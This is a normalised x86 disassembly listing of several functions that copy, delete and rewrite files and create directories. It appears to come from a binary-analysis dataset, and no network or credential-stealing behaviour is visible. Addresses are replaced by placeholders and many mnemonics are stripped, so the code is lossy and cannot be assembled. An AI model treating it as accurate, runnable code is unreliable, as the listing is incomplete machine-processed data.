sub_1000d580
sub esp 0x504
or ecx 0xffffffff
xor eax eax
lea edx [ esp ]
push ebx
push ebp
mov ebp [ esp + 0x510 ]
push esi
push edi
mov edi ebp
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x10 ]
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
test ecx ecx
jle r-xdata
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x14 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000426d
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
mov al 0x2e
push rw-data
push ebp
call sub_1000426d
mov edi eax
add esp 0x8
test edi edi
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x504
retn
mov [ esp + ecx + 0x10 ] 0x0
dec ecx
test ecx ecx
jg r-xdata
push edi
push 0x4
lea ecx [ esp + 0x118 ]
push 0x1
push ecx
call sub_10011b59
add esp 0x10
cmp eax 0x4
jne r-xdata
push ebx
call sub_100041bf
add esp 0x4
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x504
retn
cmp [ esp + ecx + 0x10 ] al
je r-xdata
jmp r-xdata
push edi
call sub_100041bf
push ebx
call sub_100041bf
mov eax [ esp + 0x520 ]
add esp 0x8
lea ecx [ esp + 0x10 ]
push 0x0
push eax
push ecx
call [ CopyFileA@IAT ]
lea edx [ esp + 0x10 ]
push edx
call [ DeleteFileA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x504
retn
lea edx [ esp + 0x110 ]
lea eax [ esp + 0x90 ]
push edx
push eax
mov [ esp + 0x11c ] 0x0
call sub_1000cfd0
mov ecx [ esp + 0x524 ]
lea edx [ esp + 0x98 ]
push ecx
push edx
call sub_10009d30
add esp 0x10
test eax eax
jne r-xdata
push ebx
push 0x4
lea ecx [ esp + 0x118 ]
push 0x1
push ecx
call sub_10011a20
push edi
push 0xc
lea edx [ esp + 0x128 ]
push 0x1
push edx
call sub_10011b59
add esp 0x20
cmp eax 0xc
jne r-xdata
push edi
push 0xc
lea eax [ esp + 0x118 ]
push 0x1
push eax
call sub_10011b59
add esp 0x10
cmp eax 0xc
jne r-xdata
push ebx
push eax
lea eax [ esp + 0x118 ]
push 0x1
push eax
mov [ esp + 0x12c ] 0x0
call sub_10011a20
lea ecx [ esp + 0x120 ]
lea edx [ esp + 0xa0 ]
push ecx
push edx
call sub_1000cfd0
lea eax [ esp + 0xa8 ]
push eax
call sub_1000504c
mov ebp eax
add esp 0x1c
test ebp ebp
je r-xdata
lea ecx [ esp + 0x110 ]
lea edx [ esp + 0x90 ]
push ecx
push edx
mov [ esp + 0x124 ] 0x0
call sub_1000cfd0
lea eax [ esp + 0x98 ]
push eax
call sub_1000504c
push 0x1
push eax
push edi
call sub_10011c70
add esp 0x18
test eax eax
jne r-xdata
push edi
push 0x4
lea edx [ esp + 0x118 ]
push 0x1
push edx
call sub_10011b59
add esp 0x10
cmp eax 0x4
je r-xdata
cmp ebp 0x400
push edi
jle r-xdata
jmp r-xdata
push ebp
lea eax [ esp + 0x118 ]
push 0x1
push eax
call sub_1000e970
mov esi eax
push ebx
push esi
lea ecx [ esp + 0x128 ]
push 0x1
push ecx
push 0x400
lea ecx [ esp + 0x118 ]
push 0x1
push ecx
call sub_1000e970
mov esi eax
push ebx
push esi
lea edx [ esp + 0x128 ]
push 0x1
push edx
jmp r-xdata
test ebp ebp
jne r-xdata
call sub_1000e910
add esp 0x20
sub ebp esi
cmp esi 0x400
jne r-xdata
sub_1000d840
sub esp 0x110
mov eax [ esp + 0x114 ]
push ebx
push ebp
push esi
push edi
push rw-data
push eax
mov [ esp + 0x1c ] 0x0
call sub_1000426d
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x110
retn
push ebp
push 0x4
lea ecx [ esp + 0x28 ]
push 0x1
push ecx
call sub_10011b59
add esp 0x10
cmp eax 0x4
jne r-xdata
push ebp
call sub_100041bf
add esp 0x4
mov esi [ esp + 0x128 ]
lea ecx [ esp + 0x2c ]
push ecx
call sub_10011b59
add esp 0x10
cmp eax 0xc
jne r-xdata
lea edx [ esp + 0x2c ]
push edx
call sub_10011b59
add esp 0x10
cmp eax 0xc
jne r-xdata
lea edx [ esp + 0x20 ]
lea eax [ esp + 0xa0 ]
push edx
push eax
mov [ esp + 0x34 ] 0x0
call sub_1000cfd0
lea ecx [ esp + 0xa8 ]
push ecx
call sub_1000504c
mov edx [ esp + 0x138 ]
push rw-data
push edx
mov ebx eax
call sub_1000426d
add esp 0x14
mov [ esp + 0x10 ] eax
test eax eax
je r-xdata
lea eax [ esp + 0x20 ]
lea ecx [ esp + 0xa0 ]
push eax
push ecx
mov [ esp + 0x34 ] 0x0
call sub_1000cfd0
lea edx [ esp + 0xa8 ]
push edx
call sub_1000504c
push 0x1
push eax
push ebp
call sub_10011c70
add esp 0x18
test eax eax
jne r-xdata
lea edi [ ebx + ebx * 2 ]
shl edi 0x1
push edi
mov [ esp + 0x20 ] edi
call sub_100049d2
mov esi eax
add esp 0x4
test esi esi
jne r-xdata
push ebp
push 0x4
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_10011b59
add esp 0x10
cmp eax 0x4
je r-xdata
lea ecx [ ebx + 0x1 ]
push ecx
call sub_100049d2
add esp 0x4
mov [ esp + 0x18 ] eax
test eax eax
push ebp
jne r-xdata
push ebp
call sub_100041bf
mov eax [ esp + 0x14 ]
push eax
call sub_100041bf
add esp 0x8
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
lea edx [ esp + 0x20 ]
lea eax [ esp + 0xa0 ]
push edx
push eax
mov [ esp + 0x2c ] 0x0
call sub_1000cfd0
lea ecx [ esp + 0xa8 ]
push esi
push ecx
call sub_10009d30
add esp 0x10
test eax eax
push ebp
push 0xc
push 0x1
je r-xdata
push ebx
push 0x1
push esi
call sub_1000e970
mov eax [ esp + 0x28 ]
push ebx
push esi
push eax
mov [ esi + ebx ] 0x0
call sub_1000d080
mov ecx edi
xor eax eax
mov edx ecx
mov edi esi
shr ecx 0x2
[ edi ]
mov ecx edx
push ebx
and ecx 0x3
[ edi ]
mov edi [ esp + 0x38 ]
mov eax [ esp + 0x3c ]
lea ecx [ esp + 0x34 ]
push edi
push ecx
push esi
mov [ esp + 0x40 ] eax
call sub_100112e0
add esp 0x2c
test eax eax
jge r-xdata
call sub_100041bf
mov edx [ esp + 0x14 ]
push edx
call sub_100041bf
push esi
call sub_1000413e
add esp 0xc
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
mov ebx [ esp + 0x10 ]
mov eax [ esp + 0x14 ]
push ebx
push eax
push 0x1
push esi
call sub_1000e910
push ebp
call sub_100041bf
push ebx
call sub_100041bf
push esi
call sub_1000413e
push edi
call sub_1000413e
add esp 0x20
xor eax eax
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
push ebp
call sub_100041bf
mov edx [ esp + 0x14 ]
push edx
call sub_100041bf
push esi
call sub_1000413e
push edi
call sub_1000413e
add esp 0x10
or eax 0xffffffff
pop edi
pop esi
pop ebp
pop ebx
add esp 0x110
retn
sub_1000dac0
sub esp 0x500
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x111 ]
mov [ esp + 0x110 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x311 ]
mov [ esp + 0x310 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x211 ]
mov [ esp + 0x210 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x411 ]
mov [ esp + 0x410 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x514 ]
test eax eax
je r-xdata
lea edx [ esp + 0x10 ]
push 0x100
push edx
push 0x0
call [ GetModuleFileNameA@IAT ]
lea eax [ esp + 0x10 ]
push eax
call sub_1000b9b0
mov edi eax
or ecx 0xffffffff
xor eax eax
mov ebp [ esp + 0x520 ]
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
[ edi ]
not ecx
dec ecx
mov [ ecx + ebp - 0x4 ] al
lea eax [ esp + 0x314 ]
lea ecx [ esp + 0x14 ]
push eax
push ecx
call sub_1000ba00
mov ebx [ esp + 0x524 ]
push ebp
push ebx
lea edx [ esp + 0x224 ]
push rw-data
push edx
call sub_1000401e
add esp 0x1c
mov ebx [ esp + 0x518 ]
or ecx 0xffffffff
mov edi ebx
xor eax eax
[ edi ]
not ecx
sub edi ecx
lea edx [ esp + 0x310 ]
mov eax ecx
mov esi edi
mov edi edx
mov ebp [ esp + 0x51c ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
push ebp
and ecx 0x3
push ebx
[ edi ] [ esi ]
lea ecx [ esp + 0x218 ]
push rw-data
push ecx
call sub_1000401e
add esp 0x10
jmp r-xdata
push ebx
call sub_1000b940
add esp 0x4
test eax eax
jne r-xdata
mov esi [ esp + 0x520 ]
push esi
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
lea eax [ esp + 0x310 ]
push ebx
push eax
call sub_10009d30
add esp 0x8
test eax eax
jne r-xdata
lea ecx [ esp + 0x310 ]
push ebp
push ecx
lea edx [ esp + 0x418 ]
push rw-data
push edx
call sub_1000401e
or ecx 0xffffffff
lea edi [ esp + 0x420 ]
xor eax eax
lea edx [ esp + 0x20 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x20 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x120 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x220 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x120 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x20 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x14
test eax eax
je r-xdata
push ebx
call sub_1000e170
add esp 0x4
push esi
push ebp
push ebx
call sub_1000e280
add esp 0xc
call sub_1000baa0
test eax eax
je r-xdata
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
jne r-xdata
or ecx 0xffffffff
lea edi [ esp + 0x410 ]
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x10 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x110 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x110 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x110 ]
push 0x0
lea edx [ esp + 0x14 ]
push ecx
push edx
call [ CopyFileA@IAT ]
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x500
retn
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebx ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
jne r-xdata
mov ebx [ esp + 0x520 ]
mov ebx [ esp + 0x520 ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push ebx
call sub_1000d840
add esp 0xc
test eax eax
jge r-xdata
or ecx 0xffffffff
lea edi [ esp + 0x410 ]
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
shr ecx 0x2
mov edi edx
lea edx [ esp + 0x10 ]
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
or ecx 0xffffffff
mov edi rw-data
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea edx [ esp + 0x110 ]
and ecx 0x3
[ edi ] [ esi ]
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x110 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi edx
mov edx ecx
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
lea ecx [ esp + 0x110 ]
push 0x0
lea edx [ esp + 0x14 ]
push ecx
push edx
call [ CopyFileA@IAT ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x500
retn
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
jne r-xdata
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push ebx
call sub_1000d840
add esp 0xc
lea edi [ esp + 0x210 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x500
retn
mov eax [ esp + 0x520 ]
push eax
push ebp
push ebx
call sub_1000e280
add esp 0xc
lea ecx [ esp + 0x110 ]
push 0x0
lea edx [ esp + 0x14 ]
push ecx
push edx
call [ CopyFileA@IAT ]
lea ecx [ esp + 0x10 ]
push ecx
push rw-data
push ebx
call sub_1000d840
add esp 0xc
test eax eax
jge r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x500
retn
sub_1000e170
sub esp 0x200
push ebx
push ebp
push esi
push edi
mov ecx 0x3f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] 0x0
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov edi [ esp + 0x214 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x110 ]
[ edi ]
not ecx
sub edi ecx
push rw-data
mov eax ecx
mov esi edi
mov edi edx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0x114 ]
push ecx
call sub_1000409a
mov edx eax
or ecx 0xffffffff
mov edi edx
xor eax eax
add esp 0x8
lea ebx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi ebx
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
test edx edx
[ edi ] [ esi ]
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
add esp 0x200
retn
mov ebx [ CreateDirectoryA@IAT ]
mov edi rw-data
or ecx 0xffffffff
xor eax eax
lea ebp [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edi ebp
mov ebp ecx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea ebp [ esp + 0x10 ]
and ecx 0x3
[ edi ] [ esi ]
mov edi edx
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov edx ecx
mov edi ebp
or ecx 0xffffffff
[ edi ]
mov ecx edx
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
jmp r-xdata
lea ecx [ esp + 0x10 ]
push 0x0
push ecx
call ebx
push rw-data
push 0x0
call sub_1000409a
mov edx eax
add esp 0x8
test edx edx
je r-xdata
sub_1000e280
sub esp 0x100
push ebx
push ebp
push esi
push edi
xor dl dl
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x11 ]
mov [ esp + 0x10 ] dl
mov [ esp + 0x90 ] dl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x91 ]
lea edx [ esp + 0x90 ]
[ edi ]
mov ecx [ esp + 0x114 ]
stosw [ edi ]
stosb [ edi ]
mov eax [ esp + 0x118 ]
push eax
push ecx
push rw-data
push edx
call sub_1000401e
mov ebx [ esp + 0x12c ]
add esp 0x10
push ebx
call [ DeleteFileA@IAT ]
lea edi [ esp + 0x90 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
lea edi [ esp + 0x90 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
push ebx
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_1000d3c0
add esp 0xc
lea edi [ esp + 0x90 ]
or ecx 0xffffffff
xor eax eax
lea edx [ esp + 0x10 ]
[ edi ]
not ecx
sub edi ecx
mov eax ecx
mov esi edi
mov edi edx
lea edx [ esp + 0x10 ]
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
xor eax eax
and ecx 0x3
[ edi ] [ esi ]
mov edi rw-data
or ecx 0xffffffff
[ edi ]
not ecx
sub edi ecx
mov esi edi
mov ebp ecx
mov edi edx
or ecx 0xffffffff
[ edi ]
mov ecx ebp
dec edi
shr ecx 0x2
[ edi ] [ esi ]
mov ecx ebp
lea eax [ esp + 0x10 ]
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000b920
add esp 0x4
test eax eax
je r-xdata
push ebx
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_1000d3c0
add esp 0xc
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
push ebx
lea ecx [ esp + 0x14 ]
push rw-data
push ecx
call sub_1000d3c0
add esp 0xc
sub_1000e470
sub esp 0x100
push ebx
push ebp
push esi
push edi
xor ebx ebx
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x91 ]
mov [ esp + 0x90 ] bl
mov [ esp + 0x10 ] bl
[ edi ]
stosw [ edi ]
stosb [ edi ]
mov ecx 0x1f
xor eax eax
lea edi [ esp + 0x11 ]
[ edi ]
mov ecx [ esp + 0x114 ]
stosw [ edi ]
cmp ecx ebx
stosb [ edi ]
jne r-xdata
mov edi [ esp + 0x118 ]
mov eax 0x1
mov dl [ ecx + edi - 0x1 ]
lea esi [ ecx + edi - 0x1 ]
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x100
retn
sub ecx eax
add eax 0xfffffffd
push eax
lea ebp [ ecx + edi ]
lea ecx [ esp + 0x94 ]
lea eax [ ebp + 0x1 ]
push eax
push ecx
call sub_10003f20
lea edx [ esp + 0x9c ]
lea eax [ esp + 0x1c ]
push edx
push eax
call sub_1000cfd0
lea edi [ esp + 0x24 ]
or ecx 0xffffffff
xor eax eax
push 0x8
[ edi ]
not ecx
sub edi ecx
lea eax [ ebp - 0x8 ]
mov edx ecx
mov esi edi
mov edi [ esp + 0x134 ]
push eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
lea ecx [ esp + 0xac ]
push ecx
call sub_10003f20
lea edx [ esp + 0xb0 ]
lea eax [ esp + 0x30 ]
push edx
push eax
mov [ esp + 0xc0 ] bl
call sub_1000cfd0
mov al [ esp + 0x38 ]
add esp 0x28
cmp al bl
je r-xdata
mov dl [ esi - 0x1 ]
inc eax
dec esi
cmp eax 0x40
jle r-xdata
lea ecx [ esp + 0x10 ]
push ecx
call sub_1000504c
mov edx [ esp + 0x124 ]
add ebp 0xfffffff7
push 0x1
push ebp
mov [ edx ] eax
lea eax [ esp + 0x9c ]
push eax
call sub_10003f20
lea ecx [ esp + 0xa0 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
mov [ esp + 0xa9 ] bl
call sub_1000cfd0
mov al [ esp + 0x28 ]
add esp 0x18
cmp al bl
je r-xdata
lea ecx [ esp + 0x10 ]
cmp dl bl
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x100
retn
lea eax [ esp + 0x10 ]
push eax
call sub_100050d7
mov ecx [ esp + 0x128 ]
add esp 0x4
pop edi
pop esi
mov [ ecx ] eax
pop ebp
xor eax eax
pop ebx
add esp 0x100
retn
lea ecx [ esp + 0x10 ]
cmp [ ecx ] 0x39
jg r-xdata
cmp [ ecx ] 0x39
jg r-xdata
mov al [ ecx + 0x1 ]
inc ecx
cmp al bl
jne r-xdata
mov al [ ecx + 0x1 ]
inc ecx
cmp al bl
jne r-xdata
cmp al 0x30
jl r-xdata
cmp al 0x30
jl r-xdata
sub_1000e630
push ecx
push ebx
push ebp
mov ebp [ esp + 0x14 ]
push esi
lea eax [ ebp + ebp * 2 ]
shl eax 0x1
push eax
mov [ esp + 0x1c ] eax
call sub_100049d2
mov ebx eax
add esp 0x4
test ebx ebx
jne r-xdata
lea eax [ ebp + 0x1 ]
push eax
call sub_100049d2
add esp 0x4
mov [ esp + 0xc ] eax
test eax eax
jne r-xdata
pop esi
pop ebp
pop ebx
pop ecx
retn
mov esi [ esp + 0x14 ]
mov ecx ebp
mov edx ecx
push edi
mov edi ebx
push ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
push ebx
and ecx 0x3
push eax
[ edi ] [ esi ]
call sub_1000d080
mov edx [ esp + 0x28 ]
xor eax eax
mov ecx edx
mov edi ebx
mov esi ecx
push ebp
shr ecx 0x2
[ edi ]
mov ecx esi
mov esi [ esp + 0x20 ]
and ecx 0x3
push esi
[ edi ]
mov eax [ esp + 0x34 ]
push eax
push ebx
mov [ eax ] edx
call sub_100112e0
add esp 0x1c
test eax eax
pop edi
jge r-xdata
pop esi
pop ebp
pop ebx
pop ecx
retn
push esi
call sub_1000413e
add esp 0x4
mov eax ebx
pop esi
pop ebp
pop ebx
pop ecx
retn
push ebx
call sub_1000413e
push esi
call sub_1000413e
add esp 0x8
xor eax eax
pop esi
pop ebp
pop ebx
pop ecx
retn
sub_1000e6f0
sub esp 0x10c
push ebx
mov ebx [ esp + 0x118 ]
push ebp
push esi
lea eax [ esp + 0x14 ]
push edi
lea ecx [ esp + 0x10 ]
push eax
mov eax [ esp + 0x124 ]
lea edx [ esp + 0x20 ]
push ecx
push edx
xor esi esi
push ebx
push eax
mov [ esp + 0x24 ] esi
mov [ esp + 0x2c ] esi
call sub_1000e470
add esp 0x14
test eax eax
jge r-xdata
mov ebp [ esp + 0x12c ]
cmp ebp esi
je r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10c
retn
lea edi [ esp + 0x1c ]
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
sub edi ecx
mov edx ecx
mov esi edi
mov edi ebp
shr ecx 0x2
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
mov edi ebp
or ecx 0xffffffff
xor eax eax
[ edi ]
not ecx
dec ecx
jne r-xdata
mov eax [ esp + 0x128 ]
push ebp
push eax
lea ecx [ esp + 0x24 ]
push rw-data
push ecx
call sub_1000401e
lea edx [ esp + 0x2c ]
push edx
call sub_1000b960
add esp 0x14
test eax eax
jne r-xdata
pop edi
pop esi
pop ebp
or eax 0xffffffff
pop ebx
add esp 0x10c
retn
mov edi ebp
or ecx 0xffffffff
xor eax eax
mov edx [ esp + 0x120 ]
[ edi ]
mov eax [ esp + 0x10 ]
not ecx
dec ecx
sub ebx eax
sub ebx ecx
lea ecx [ esp + 0x14 ]
sub ebx 0xc
push ecx
